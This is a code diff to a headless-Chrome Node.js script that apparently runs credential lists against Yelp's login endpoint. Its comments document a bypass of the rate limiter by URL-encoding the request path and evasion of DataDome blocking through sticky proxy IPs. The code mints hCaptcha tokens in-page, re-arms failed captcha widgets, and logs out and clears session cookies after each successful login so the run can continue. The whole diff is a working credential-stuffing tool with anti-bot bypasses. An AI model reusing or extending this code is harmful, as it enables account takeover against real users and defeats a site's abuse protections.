@@ -5,17 +5,15 @@ const { spawn } = require('child_process');
 const os = require('os');
 const path = require('path');
 
-// Fast path: hydrated page(s), hCaptcha token minted in-page, POST to the encoded login
-// endpoint via fetch.
+// Fast path: hydrated page(s), hCaptcha token minted in-page, POST /login/newajax via fetch.
 // Hard limits measured on one sticky IP:
 //   1) 15 POST / 60 s on /login/newajax (also /login) -> 429 "routing service".
 //   2) ~32 POST per sticky IP on the normal path     -> 403 (DataDome).
 //
 // URL-encoding any character of the path skips the routing-service limiter: the edge
-// matches the raw string, the app still decodes and routes to the same handler. 71
-// consecutive encoded POSTs on one IP: 0 x 429, 0 x 403 (vs 15 then 429 on the normal
-// path); 0-11% land on the magic-link handler instead (retried). A 250-POST runner run
-// on one IP produced 249 verdicts, 0 unknown, 0 x 429/403.
+// matches the raw string, the app still decodes and routes to the same handler. In 70
+// consecutive encoded POSTs on one IP: 0 x 429, 0 x 403 (vs 14 then 429 on the normal
+// path). ~11% of encoded POSTs land on the magic-link handler instead (retried).
 // POST_PATH can be set back to /login/newajax to use the plain path.
 //
 // env: BID LIST OUT PU_BASE PW [POST_PATH] [LANES] [LANE_PACE] [MAXT] [SITEKEY] [PACE]
@@ -114,11 +112,10 @@ function paceDelay() {
   return 0;
 }
 
-// One lane per host: extra tabs in the same browser share the proxy IP and its POST
-// budget, so lanes add parallelism, not budget. Each lane has its own csrf token and
-// hCaptcha widget; POST stays same-origin so there is no CORS involved.
+// One lane per independent edge bucket. Each lane is a separate tab with its own
+// csrf token and hCaptcha widget; POST stays same-origin so no CORS involved.
 const lanes = HOSTS.map((host, idx) => ({
-  idx, host, base: 'https://' + host, sid: null,
+  idx, host, base: 'https://' + host, sid: null, tid: null,
   csrf: '', ready: false, dead: false, pausedUntil: 0,
   posted: 0, r429: 0, tokFail: 0, tokStreak: 0, times: []
 }));
@@ -145,7 +142,7 @@ const lanes = HOSTS.map((host, idx) => ({
     '--disable-renderer-backgrounding',
     '--disable-features=CalculateNativeWinOcclusion,IntensiveWakeUpThrottling,Prerender2,SpeculationRulesPrefetch',
     // Bandwidth: no images, no webfonts, capped persistent disk cache.
-    ...(NO_MEDIA ? ['--blink-settings=imagesEnabled=false', '--disable-remote-fonts'] : []),
+    '--blink-settings=imagesEnabled=false', '--disable-remote-fonts',
     ...(CACHE_MB > 0 ? ['--disk-cache-dir=' + CDD, '--disk-cache-size=' + (CACHE_MB * 1024 * 1024), '--media-cache-size=1'] : []),
     '--proxy-server=http://127.0.0.1:' + LP, '--remote-debugging-port=' + CP,
     'about:blank'
@@ -184,7 +181,7 @@ const lanes = HOSTS.map((host, idx) => ({
     const t = await send('Target.getTargets');
     if (t && t.result) {
       const pg = t.result.targetInfos.find(x => x.type === 'page');
-      if (pg) { const a = await send('Target.attachToTarget', { targetId: pg.targetId, flatten: true }); if (a && a.result) lanes[0].sid = a.result.sessionId; }
+      if (pg) { const a = await send('Target.attachToTarget', { targetId: pg.targetId, flatten: true }); if (a && a.result) { lanes[0].sid = a.result.sessionId; lanes[0].tid = pg.targetId; } }
     }
   }
   if (!lanes[0].sid) { rec({ event: 'abort', why: 'cdp' }); chrome.kill(); relay.close(); return; }
@@ -200,9 +197,7 @@ const lanes = HOSTS.map((host, idx) => ({
     if (!lanes[k].sid) { rec({ event: 'lane_dead', host: lanes[k].host, why: 'tab' }); lanes[k].dead = true; }
   }
 
-  // Per-tab setup: network events, focus, and the bandwidth filters.
-  for (const lane of lanes) {
-    if (!lane.sid) continue;
+  async function setupTab(lane) {
     await sendS(lane, 'Page.enable'); await sendS(lane, 'Network.enable', {});
     await sendS(lane, 'Emulation.setFocusEmulationEnabled', { enabled: true });
     await sendS(lane, 'Page.bringToFront', {});
@@ -221,25 +216,57 @@ const lanes = HOSTS.map((host, idx) => ({
     }
   }
 
+  // Per-tab setup: network events, focus, and the bandwidth filters.
+  for (const lane of lanes) {
+    if (!lane.sid) continue;
+    await setupTab(lane);
+  }
+
+  // A logged-out in-place reload keeps SPA state and often never rebuilds the form.
+  // Open a clean tab on /login/ instead (same profile = cookies already logged out).
+  async function freshTab(lane) {
+    const c = await send('Target.createTarget', { url: lane.base + '/login/' });
+    if (!c || !c.result || !c.result.targetId) return false;
+    const a = await send('Target.attachToTarget', { targetId: c.result.targetId, flatten: true });
+    if (!a || !a.result) return false;
+    const oldTid = lane.tid;
+    lane.sid = a.result.sessionId; lane.tid = c.result.targetId;
+    lane.csrf = '';
+    if (oldTid) { try { await send('Target.closeTarget', { targetId: oldTid }); } catch (e) {} }
+    await setupTab(lane);
+    return true;
+  }
+
   // keepFirst: the page is usually already hydrated right after the ddok probe, so the
   // first round checks it in place instead of paying for another full page load.
   async function hydrate(lane, rounds, keepFirst) {
+    let last = '';
     for (let a = 0; a < rounds; a++) {
       const keep = a === 0 && keepFirst;
       if (!keep) await sendS(lane, 'Page.navigate', { url: lane.base + '/login/' });
       // A kept page gets a short probe only: if it is not ready, reload instead of waiting.
       for (let k = 0; k < (keep ? 2 : 20); k++) {
         await sleep(1000);
-        const s = await ev(lane, `JSON.stringify({f:!!document.getElementById('ajax-login'),h:!!window.hcaptcha,l:document.documentElement.outerHTML.length})`);
-        try { const o = JSON.parse(s); if (o && o.f && o.h && o.l > 400000) return true; } catch (e) {}
+        const s = await ev(lane, `JSON.stringify({f:!!document.getElementById('ajax-login'),h:!!window.hcaptcha,l:document.documentElement.outerHTML.length,u:location.pathname,t:(document.title||'').slice(0,40)})`);
+        if (s) last = s;
+        try { const o = JSON.parse(s); if (o && o.f && o.h && o.l > 250000) return true; } catch (e) {}
       }
     }
-    return false;
+    return last;
   }
   async function armWidget(lane) {
-    // Prefer the page's own widget: a self-rendered widget has no site rqdata and its
-    // token is rejected server-side (PITFALLS 25). The field must be hcaptcha_response
-    // (underscore); h-captcha-response is ignored.
+    // A self-rendered widget is fine: same sitekey, token is accepted as long as the
+    // field name is hcaptcha_response (underscore). h-captcha-response is ignored.
+    // A fresh background tab may still be loading the hCaptcha bundle: poll for it.
+    for (let k = 0; k < 14; k++) {
+      const r = await oneArm(lane);
+      if (r !== 'no-api' && String(r).indexOf('err') !== 0) return r;
+      await sleep(600);
+    }
+    return 'no-api';
+  }
+  async function oneArm(lane) {
+    try { await sendS(lane, 'Page.bringToFront', {}); } catch (e) {}
     return await ev(lane, `(function(){
       if(window.__fcReady) return 'ready:'+window.__wid;
       if(!window.hcaptcha) return 'no-api';
@@ -348,7 +375,7 @@ const lanes = HOSTS.map((host, idx) => ({
   const successes = [], msAll = [], tokAll = [], postAll = [];
   let blocked = false;
   let postPath = POST_PATH;
-  let sinceReload = 0, reloads = 0, unresolved = 0;
+  let sinceReload = 0, reloads = 0, unresolved = 0, rearms = 0;
 
   for (let i = 0; i < creds.length && !blocked; i++) {
     if (Date.now() - t0 > MAXT) { rec({ event: 'timecap', at: i }); break; }
@@ -378,6 +405,17 @@ const lanes = HOSTS.map((host, idx) => ({
       if (!tok) {
         tokFail++; lane.tokFail++; lane.tokStreak++;
         rec({ event: 'tokfail', at: i + 1, lane: lane.host, tokMs, streak: lane.tokStreak });
+        // A freshly opened tab has the API but not a usable widget: execute() bails in
+        // ~5 ms. Drop the widget, render a new one, retry (capped) before declaring dead.
+        if (rearms < 3) {
+          rearms++;
+          try { await ev(lane, `(function(){try{if(window.__wid&&window.hcaptcha)window.hcaptcha.reset(window.__wid);}catch(e){}window.__fcReady=false;window.__wid=null;var e=document.getElementById('__fcap');if(e)e.remove();return 1;})()`); } catch (e) {}
+          await sleep(1200);
+          const aw = await armWidget(lane);
+          const dp = await ev(lane, `JSON.stringify({u:location.href.slice(0,60),t:(document.title||'').slice(0,30),l:document.documentElement.outerHTML.length,h:typeof window.hcaptcha,f:!!document.getElementById('ajax-login'),r:!!window.__fcReady})`);
+          rec({ event: 'rearm', at: i + 1, lane: lane.host, try: rearms, armed: String(aw), dbg: String(dp) });
+          if (String(aw).indexOf('err') !== 0 && aw !== 'no-api') { lane.tokStreak = 0; continue; }
+        }
         if (lane.tokStreak >= 2) { lane.dead = true; rec({ event: 'lane_dead', host: lane.host, why: 'captcha' }); }
         if (!lanes.some(l => l.ready && !l.dead)) { rec({ event: 'abort', why: 'captcha', at: i + 1, tokMs }); blocked = true; break; }
         await sleep(800);
@@ -484,10 +522,32 @@ const lanes = HOSTS.map((host, idx) => ({
 
       if (isSuccess) {
         try { await sendS(lane, 'Page.bringToFront', {}); } catch (e) {}
-        await sendS(lane, 'Page.navigate', { url: lane.base + '/logout?return_url=%2Flogin%2F' });
-        await sleep(4000);
-        let h = await hydrate(lane, 4, false);
-        if (!h) { h = await hydrate(lane, 4, false); }
+        // Log out in page + wipe the storage Yelp keeps the logged-in marker in, then
+        // delete session cookies. /login/ otherwise client-side bounces to `/`.
+        await ev(lane, `(async()=>{ try{ await fetch('/logout',{credentials:'include'}); }catch(e){} try{ localStorage.clear(); sessionStorage.clear(); }catch(e){} return 1; })()`);
+        for (let k = 0; k < 20; k++) {
+          await sleep(400);
+          const ck = await sendS(lane, 'Network.getAllCookies', {});
+          const all = (ck && ck.result && ck.result.cookies) || [];
+          const zs = all.filter(x => x.name === 'zss');
+          if (!zs.length) break;
+          for (const z of zs) { try { await sendS(lane, 'Network.deleteCookies', { name: z.name, domain: z.domain, path: z.path || '/' }); } catch (e) {} }
+        }
+        await sleep(700);
+        // A logged-out /login/ can still bounce to the home page once. Probe the path
+        // until the form is really there, and only then arm a widget.
+        let h = false;
+        for (let k = 0; k < 4 && !h; k++) {
+          const hh = await hydrate(lane, 2, false);
+          const p = await ev(lane, `JSON.stringify({u:location.pathname,l:document.documentElement.outerHTML.length})`);
+          rec({ event: 'relogin_probe', at: i + 1, lane: lane.host, k: k + 1, ok: !!hh, dbg: String(p) });
+          if (hh) { h = true; break; }
+          await sleep(1500);
+        }
+        if (!h) {
+          if (await freshTab(lane)) h = await hydrate(lane, 3, false);
+          if (h) rec({ event: 'relogin_tab', at: i + 1, lane: lane.host });
+        }
         if (!h) { rec({ event: 'rehydrate_fail', at: i + 1, lane: lane.host }); lane.dead = true; continue; }
         lane.csrf = await csrfOf(lane);
         await armWidget(lane);
